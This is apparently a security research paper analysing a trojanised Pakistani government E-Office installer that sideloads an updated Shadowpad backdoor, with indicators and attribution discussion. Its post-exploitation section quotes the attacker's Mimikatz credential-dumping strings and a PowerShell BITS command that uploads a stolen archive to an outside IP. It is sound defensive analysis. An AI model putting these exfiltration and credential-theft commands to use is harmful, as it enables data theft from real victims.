Since 2019, multiple\nthreat actors have been using this same malware family, making its attribution more difficult. For example, Earth Akhlut, a\nthreat actor that we spoke about at VB2020, also uses it.\n\nIn this campaign, we noticed how a threat actor weaponized an application developed by a South Asian country to\ncompromise some of its entities. The application is delivered to governmental entities only, with the purpose of improving\ntheir efficiency. However, the compromised version we found came with a Shadowpad payload, obfuscated with an\nunreported method.\n\nIn this presentation we will describe how the installer was modified to deliver the malicious payload. We will explain the\nmultiple obfuscations we have seen for Shadowpad over the years, and what the differences are with this new version. We\nwill show how it helped us to correlate this campaign with previous campaigns by the same threat actor. It also helped us\nfind other Shadowpad samples from different threat actors, confirming that this is a shared malware family that is still\nbeing developed. We will also discuss some infrastructure reuse and quickly describe another malware family that seems\nmore specific to a single threat actor. Finally, we plan to show some clever tricks that probably helped the attack to stay\nunder the radar for a few months.\n\n**INTRODUCTION**\n\nIn March 2023, we stumbled upon an mscoree.dll 64-bit file located in the ‘%PROGRAMFILES%\\Common Files\\System\\’\ndirectory, detected through a generic signature. The name of the file is frequently used for Shadowpad samples, which\ntriggered our interest. We did not know this would be the beginning of a long journey that would include malware\nreversing, extraction of configuration files, infrastructure analysis, and an attribution nightmare involving multiple\nallegedly Chinese threat actors.\n\nAfter analysing the file, we could confirm it was indeed a Shadowpad sample, however its obfuscation was different from\nwhat we had seen before. This was interesting by itself, but on top of that, we found that the file was being delivered by an\nMSI installer built by a Pakistani governmental entity, suggesting a possible supply chain attack.\n\nIn this paper, we will go through each of the investigation steps, listing not only our learnings but also the information that\nwas left missing or that we were unable to confirm.\n\n**MSI INSTALLER ANALYSIS**\n\nThe SHA256 hash of the MSI installer is c1feef03663a9aa920a9ab4eb2ab7adadb3f2a60db23a90e5fe9b949d4ec22b6. Its\nmetadata contains tags mentioning ‘eOffice’ and its developing agency.\n\n_Figure 1: MSI installer file properties._\n\nE-Office [1] is an app developed by the Government of Pakistan, described as ‘helping the government departments to go\npaperless’ and ‘aimed at improving internal efficiencies in an organization through electronic administration.’ This\ndescription suggests that E-Office is only delivered to government organizations. After some research, we learned that this\npiece of software is intended for government entities only and is not publicly available, which enforces our belief that the\nincident could be a supply-chain attack.\n\n\n-----\n\nWe confirmed that we were handling version 2.0.3.0 of the NITB’s E-Office application after running it in a virtual\nmachine and seeing multiple official logos.\n\nIt should be noted that, because the MSI file is not signed, anyone can modify it. This means that the entity developing the\napplication was not necessarily compromised.\n\nHowever, this would imply that the threat actor had retrieved a legitimate MSI installer from a Pakistani governmental\nentity prior to this incident, because the affected E-Office version was not publicly available at the time.\n\nWe also noticed that TCP requests are sent to a local IP address on port 50000 as soon as the installation process is started.\n\n_Figure 2: Suspicious network connection after running the MSI installer._\n\nWe will discuss those requests in a dedicated section below.\n\nWe searched for legitimate versions of the E-Office installer to compare them with our MSI file and found that one\nPakistan government website linked a legitimate installer of the same version from April to July 2023.\n\nThe metadata was similar, and only three files were added to our malicious MSI package:\n\n - Telerik.Windows.Data.Validation.dll (9f1e83cbb7d43eec8c797d98436c878c78ccd128cabb01ea28db682c6f1ee18c)\n\n - mscoree.dll (4e3a455e7f0b8f34385cd8320022719a8fc59d8bc091472990ac9a56e982a965)\n\n - mscoree.dll.dat (17272a56cbf8e479c085e88fe22243685fac2bc041bda26554aa716287714466)\n\nTelerik.Windows.Data.Validation.dll is a 64-bit non-DLL PE executable file, which turns out to be the legitimate\napplaunch.exe file signed by Microsoft. This executable is known to be abused by multiple threat actors to sideload\nmalicious files named mscoree.dll.\n\nMeanwhile, mscoree.dll is a malicious DLL that decrypts and loads the mscoree.dll.dat file, which is the Shadowpad\npayload. The hash of mscoree.dll matches the hash that we saw in our telemetry, confirming that this is the installer that\ndropped it.\n\nBy using tools like lessmsi [2], we can analyse the MSI package and find out how those files are launched. The tables\nshown in Figures 3 and 4 are relevant to our investigation.\n\nAs shown in Figure 3, the MSI installer has a custom action named ‘TelerikValidation’ with type 3170 that runs the file\nTelerik.Windows.Data.Validation.dll without any parameter from the installation folder.\n\n_Figure 3: MSI CustomAction table._\n\nThe value type of 3170 is the sum of the following values:\n\n - 34: EXE file with a path referencing a directory [3].\n\n - 3072: Queues for execution at a scheduled point within the script and executes with no user impersonation; runs in\nsystem context [4].\n\n - 64: A synchronous execution that ignores exit code and continues [5].\n\nThis TelerikValidation custom action is listed in the InstallExecuteSequence table (Figure 4) and is launched after installing\nthe files but before creating the shortcuts and registry keys.\n\n\n-----\n\n_Figure 4: MSI InstallExecuteSequence table._\n\nNow let’s analyse the piece of malware delivered by the backdoored MSI installer.\n\n**SHADOWPAD ANALYSIS**\n\nShadowpad is an advanced malware family that was discovered [6] in 2017 after a supply-chain attack on a popular piece\nof server management software, attributed to APT41. Since 2019, this malware has been shared among multiple Chinese\nthreat actors such as Earth Akhlut [7] and Earth Lusca [8].\n\nThe applaunch.exe file copied to the E-Office folder is a legitimate file signed by Microsoft. As aforementioned, this\nversion is known to be vulnerable to a DLL-sideloading vulnerability. Any file named mscoree.dll and copied in the same\ndirectory as applaunch.exe will be loaded in memory, and the export named ‘IEE’ will be called. This behaviour has been\nabused for many years by threat actors to sideload malicious DLLs.\n\nWhen looking at the code of the IEE export, we notice that the threat actor checks some bytes of the loading executable at a\nhard-coded offset to verify that they match a particular value. If this is not the case, the DLL closes itself. This code excerpt\nis intended as an anti-sandbox analysis code, where it is a common practice to run DLLs via rundll32.exe or similar\nlaunchers instead of the legitimate yet vulnerable executable.\n\nAfter that check, the rest of the code is obfuscated.\n\n**DLL and payload obfuscation**\n\nWe noticed two different obfuscation techniques, both of which are used in the DLL and the decrypted payload.\n\nThe first technique prevents the disassembler from statically following the code flow, as every instruction is followed by a\ncall to a function that calculates the address of the next instruction. The disassembler gets lost and does not decode the\nproper instructions, making static analysis extremely difficult.\n\n\n-----\n\nThis technique is an evolution of what Positive Technologies first described [9] in 2021, where the same function was\ncalled after each instruction to jump to the next instruction.\n\nIn this updated version, the called function is always different. Where the previous version read four bytes following the\n‘call’ instruction, the updated version performs an additional operation (ADD, SUB, or XOR) between the gathered value\nand a fixed value that changes in every function. The calculated value is pushed to the stack and the application calls the\nRET instruction to redirect the code flow to the calculated address.\n\n_Figure 5: Code flow obfuscation._\n\nIn Figure 5, for example, the four bytes encircled in red are read by the calc_addr_next_instruction_1 function. Afterwards,\nan additional operation is performed on the resulting value using XOR with a hard-coded value specific to this function.\nThe result is then added to the value encircled in yellow to get the address of the next instruction. Hundreds of similar\nfunctions exist within the code of the DLL or the payload.\n\nThe second technique does not obfuscate the code flow. Instead, it adds useless instructions and branches that are never\ntaken. Within the code, thousands of comparisons between a register value and a zero followed by conditional branching\nare performed. As the register value is never null, the related branch is never taken, filling the disassembled code with\nuseless comparisons and dead code, which proves burdensome for analysts.\n\nWe managed to find multiple samples using these two obfuscation techniques. The oldest one we found was uploaded to\n_VirusTotal in late February 2022. However, we did not find it in our telemetry, nor were we able to identify the threat actor_\nbehind this file.\n\n**Configuration file**\n\nThe configuration file is available in memory only, in an encrypted form.\n\n_Figure 6: First part of the encrypted configuration._\n\n_Figure 7: Second part of the encrypted configuration (truncated)._\n\nWe detail the simplified structure here:\n\n - Four-byte configuration header (boxed in red).\n\n - List of the offsets of encrypted items offsets (boxed in yellow), with two bytes per offset.\n\n - Hard-coded delimiter (in this case, in hex 08 08 08 08 08 08 04 04 04 04 04 04 04 02 02 02, boxed in green).\n\n - Encrypted items: for every encrypted item, a two-byte encryption key (boxed in pink), and the encrypted item itself\n(boxed in blue).\n\n\n-----\n\nIt is important to note that the encryption scheme is different from what we saw in previous Shadowpad versions.\nHistorically, the encryption of the Shadowpad configuration was a custom algorithm, with different threat actors using\ndifferent algorithms or constants.\n\nIn this case, each Shadowpad sample that we found encrypted its configuration file with the same algorithm:\n\n - A base encryption of 16 bytes concatenated with two bytes (boxed in pink in Figure 7) that are different for each item\nof the configuration file.\n\n - The calculated MD5 of the 18 bytes obtained in the aforementioned.\n\n - The calculated MD5 passed to the CryptDeriveKey function, which returns 16 bytes based on that input.\n\n - Those 16 bytes are used as an AES-CBC 128-bit encryption key, with 16 zero bytes as initialization vector.\n\nA variant of this encryption scheme was documented [10] by PwC in a report in December 2021.\n\nThe oldest sample we found using this encryption scheme was uploaded to VirusTotal in March 2021. However, we did not\nfind it in our telemetry and we were not able to identify the threat actor behind this file.\n\nIf we decrypt the different items of the configuration file, we can find multiple pieces of information, including the\nfollowing:\n\n - File paths and file names\n\n - Registry keys used for persistence\n\n - Service names and description\n\n - Full paths to processes to inject into\n\n - List of C&Cs\n\n - List of proxies\n\n - List of DNS servers\n\n - User agents and other HTTP headers\n\n - A campaign note\n\nIt should be noted that any field can be empty.\n\nThe following are the different ‘campaign notes’ that we found in the samples related to this threat actor:\n\n**Campaign note** **Comment**\n\n0908_0908 Probably related to the date of the campaign that took place on 8 September 2022\n\nREVER-0512 Probably related to the date of the campaign that took place on 12 May 2022\n\n20220215 Probably related to the campaign that took place on 15 February 2022\n\n1114 Probably related to the campaign on 11 November, which likely took place in 2021\n\ncsp.live.obo ‘Live’ and ‘obo’ are probably references to the C&C servers found in the configuration\n(live.musicweb[.]xyz and obo.videocenter[.]org), while ‘csp’ might mean\n‘communications service provider’\n\n**Pivots on the obfuscation and encryption scheme**\n\nAs mentioned previously, we used obfuscation techniques and encryption scheme analysis to pivot and find related samples.\nIn total, we found 11 Shadowpad loaders and six payloads related to this threat actor. Furthermore, we found 25 additional\nShadowpad loaders and five additional payloads that we could not link with strong confidence to this threat actor.\n\nAmong these samples, nine different encryption keys were used. We believe that two of them are related to our threat actor,\nwhile we have no strong attribution for the seven remaining keys. As Shadowpad has been known to be a shared backdoor\nsince at least 2019, it is likely that other threat actors also have access to this updated version.\n\nOn three of the samples sharing one of the seven remaining encryption keys, we noticed how specific profiles hosted on the\nsocial.msdn.microsoft.com domain were used as dead drop resolvers (DDR) to get the final C&C server. Notably, APT41\nhas used this technique in the past [11]. However, all the involved profile pages were offline, so we could not retrieve the\nfinal C&C server nor confirm the APT41 attribution.\n\n**NETWORK STEALTH**\n\nWhen first analysing the malicious MSI installer, we noticed a TCP connection to the IP address 10.2.101.110 on port\n50000. After analysing the Shadowpad malware sample, we confirmed that this was indeed the C&C IP address and port\nset in the configuration.\n\n|Campaign note|Comment|\n|---|---|\n|0908_0908|Probably related to the date of the campaign that took place on 8 September 2022|\n|REVER-0512|Probably related to the date of the campaign that took place on 12 May 2022|\n|20220215|Probably related to the campaign that took place on 15 February 2022|\n|1114|Probably related to the campaign on 11 November, which likely took place in 2021|\n|csp.live.obo|‘Live’ and ‘obo’ are probably references to the C&C servers found in the configuration (live.musicweb[.]xyz and obo.videocenter[.]org), while ‘csp’ might mean ‘communications service provider’|\n\n\n-----\n\nHowever, we noticed that running a clean E-Office version also provoked connections to the same IP and port. After a more\nthorough investigation involving SSL stripping – a man-in the-middle (MitM) attack – we discovered that the legitimate\nE-Office application makes a GET request to hxxps://10.2.101.110:50000/VI/Application/CheckForApplicationUpdate/1\nwith some custom HTTP headers such as ‘Sender: eOffice.Client.WPF’, ‘machine_name’, ‘app_version’ or ‘os_type’,\nwhile the malware makes a POST request to hxxps://10.2.101.110:50000/5BE96B824C4AD5A.\n\n_Figure 8. Legitimate network connection by E-Office application._\n\nWe did not search further, as the URL is self-explanatory. It is likely that the legitimate E-Office application connects to\nthis IP address and port to search for updates. It also seems very unlikely that every Pakistani government organization that\ndeploys E-Office has the same network mapping. However, we do not know if the address of the update server can be\nconfigured or if it was unintentionally left as a debug feature from the developers.\n\nIn all cases, it was clever for the attackers to use an IP address that is hard-coded in a legitimate application used by their\ntargets.\n\nOn the defender’s side, we recommend searching for POST requests to the IP address 10.2.101.110 on port 50000, as the\nlegitimate application seems to send GET requests. It is also worth noting that in the case of a malicious installer, the\nconnection happens right after launching the installation process, while in the case of a clean installer, the connection is\nonly triggered after running the E-Office application.\n\n**TARGETS**\n\nWe found three targets within our telemetry, all located in Pakistan; two are from the government/public sector and are\noriented toward finance, while one is from a telecommunications provider.\n\nThe first victim we found was a Pakistani government entity, and we were able to confirm that the Shadowpad sample\nlanded on the victim after executing the backdoored E-Office installer analysed in the previous section. The infection took\nplace on 28 September 2022.\n\nThe second victim was a Pakistani public sector bank. In this incident, different Shadowpad samples were detected on 30\nSeptember 2022 after E-Office was installed. We could not retrieve the related E-Office installer.\n\nOther related Shadowpad samples were detected at a Pakistani telecommunications provider in May 2022. Later analysis\nshowed that one of them had been there since mid-February 2022. We were unable to find the infection vector for this\nincident.\n\n**POST-EXPLOITATION AND DATA EXFILTRATION**\n\nWithin our telemetry, we noticed that the attacker used a portable Mimikatz variant the day following the appearance of a\nShadowpad sample. Although we could not confirm it because we did not have access to the file, we found traces of strings\n‘privilege::debug’ followed by ‘sekurlsa::logonpasswords’, which looks like the Mimikatz sekurlsa [12] plug-in that dumps\nLSASS secrets.\n\nFour days after that, we found traces of a password-encrypted RAR archive in the same directory as the Mimikatz sample\nmentioned above.\n```\nrar.exe a -hp1234QWER!@#$ -v5m c:\\windows\\help\\1019.rar c:\\windows\\help\\*.txt\n\n```\nThe threat actor then used a very simple PowerShell command that relies on Background Intelligent Transfer Service\n(BITS) for data exfiltration.\n```\npowershell -nop -exec bypass \"\"import-module bitstransfer;start-bitstransfer -source c:\\\nwindows\\help\\1019.rar -destination http://158.247.230.255/1019.rar -transfertype upload\"\"\n\n```\nWe could not retrieve the exfiltrated file, but it is very likely that it contained the credentials dumped by Mimikatz. By\nlooking at OSINT sources, we learned that the threat actor likely had control over that IP address from late April 2022 to\nlate October 2022.\n\n**ATTRIBUTION**\n\nWe did not find enough evidence to attribute this attack to a known threat actor.\n\n\n-----\n\nAs mentioned earlier, since Shadowpad is a shared malware family, we cannot rely on it to attribute the attack to a\nparticular threat actor.\n\nOf two out of three victims of this campaign, we could not find any further malware samples or tactics, techniques, and\nprocedures (TTPs) that could be helpful for the attribution of the campaign. In the third victim’s environment, however, we\nfound multiple malware families that we analysed in our search for links to known threat actors.\n\n**Calypso dropper**\n\nWe found two samples that matched the Calypso dropper described [13] by Positive Technologies, and the Trojan.Misics.1\nmalware described by Dr.Web [14] that has several links to the same threat actor.\n\nWe found that one sample referenced in Sophos’s CloudSnooper report [15] had the same custom obfuscation, similar\ndebug messages and a similar file-naming convention to some of the Calypso droppers we analysed. Another researcher\nnoticed [16] similarities in the configuration of the delivered payloads. Thus, either the CloudSnooper campaign was\nperformed by the Calypso threat actor, or this dropper is a malware family shared among multiple threat actors.\n\nUnfortunately, we were not able to find clear links between this dropper and the Shadowpad malware samples, nor did we\nfind the infection vector.\n\n**Deed RAT**\n\nAnother of the malware samples that we found turned out to be what Positive Technologies describes as Deed RAT in its\nSpace Pirates report [17].\n\nOne file was named bdch.dll and loaded and decrypted a file named bdch.tmp. The features were similar to those described by\n_Positive Technologies, although we found one additional plug-in named ‘NetAgent’. We noticed the configuration format was_\nvery similar to the Shadowpad configuration, with a four-byte header, offsets to encrypted items, a delimiter (in hex, 08 08 08\n08 01 01 01 01 09 09 09 09 DE DE 43 D0), and encrypted items. As the modular structure, features and configuration\nstructure look similar, we believe this could be a Shadowpad variant obfuscated differently, rather than a new malware family.\n\nWe found that a Deed RAT sample also named bdch.tmp was listed in SentinelOne’s Moshen Dragon report [18]. That\nreport also lists SNAC.log files that are described in Trellix’s Plugx Talisman report [19]. Interestingly, the Trellix report\nmentions PlugX payloads named TmDbgLog.dll.tsc, which are also described by Dr.Web in a report [20] related to the\nCalypso threat actor. Thus, we assess with low confidence that this Shadowpad variant named ‘Deed RAT’ could belong to\nthe Calypso threat actor’s toolkit too.\n\nWe could not find any link between our Shadowpad samples and this Deed RAT sample, nor do we know how it was\ndelivered to the victim.\n\n**DriftingCloud Windows malware**\n\nThe last malware family is a Windows executable embedding Python code detected in April 2022. We believe, based on\ninfrastructure overlap, it is related to the DriftingCloud [21] threat actor.\n\nWe found the same sample targeting a totally different location and industry, enforcing our opinion that this sample is\nprobably unrelated to the threat actor behind the campaign described in this paper.\n\n**Timeline**\n\nThe following timeline is intended to ease the understanding of the different malware that were found in one of the victims\nof this campaign.\n\n - November 2021: earlier Calypso dropper file creation\n\n - 15 February 2022: earlier Shadowpad sample file creation\n\n - 8 March 2022: detection of second Calypso dropper\n\n - 9 March 2022: Deed RAT file creation\n\n - 21 April 2022: detection of DriftingCloud malware\n\n - 27 April to 12 May 2022: detection of three further Shadowpad samples\n\nBecause none of these events happened on the same date, and we could not find any relationship between them, we decided\nwe could not rely on those malware families to attribute this attack.\n\n**Bronze University Shadowpad sample**\n\nIn February 2022, Dell SecureWorks published a report [22] on Shadowpad, in which multiple threat actors were\ndescribed as using this malware family. In the list of indicators of compromise (IOCs), we noticed that the payload\n\n\n-----\n\n253f474aa0147fdcf88beaae40f3a23bdadfc98b8dd36ae2d81c387ced2db4f1 uses the new encryption scheme that we\ndescribed previously, with a base encryption key that we attribute to our threat actor. The related C&C domain names\nare live[.]musicweb[.]xyz and obo[.]videocenter[.]org. Kaspersky lists [23] those domain names in a report mentioning\ntargets in the industrial and telecommunications sectors in both Pakistan and Afghanistan, but does not include strong\nattribution links.\n\n_Dell SecureWorks attributes this sample to Bronze University, which matches the threat actor we call Earth Lusca [8]._\n\nHowever, we question this attribution. All the other Shadowpad samples attributed to Bronze University in the IOC list are\nnamed log.dll.dat, while our payload is named iviewers.dll.dat. Moreover, none of those samples uses the new encryption\nscheme that we described previously. In fact, they use the old encryption scheme described [10] by PwC, using the\n0x107e666d constant. Finally, the C&C domain names of the 253f474aa0147fdcf88beaae40f3a23bdadfc98b8dd36ae2d81\nc387ced2db4f1 payload do not match the usual Earth Lusca registration pattern that we know of.\n\nThus, we prefer to refrain from attributing this whole attack to Earth Lusca. However, we will be happy to correct our\nassessment in the future if we have further proof of the links between this campaign and Earth Lusca.\n\n**CONCLUSION**\n\nFrom what we have seen so far, this whole campaign was the result of a very capable threat actor that managed to retrieve\nand modify the installer of a governmental application to compromise at least three sensitive targets.\n\nThe fact that the threat actor has access to a recent version of Shadowpad potentially links it to the nexus of Chinese threat\nactors, although we cannot point to a particular group with confidence. However, we managed to show how the Shadowpad\nauthors continue to update their piece of malware, making its reverse engineering more difficult. Finally, we detailed how\nthis threat actor carefully chose one of its C&C addresses to blend in with the legitimate network traffic, which shows great\npreparation capability.\n\nWe expect to see more threat actors using this updated Shadowpad version in the future.\n\n**REFERENCES**\n\n[1] [National Information Technology Board.
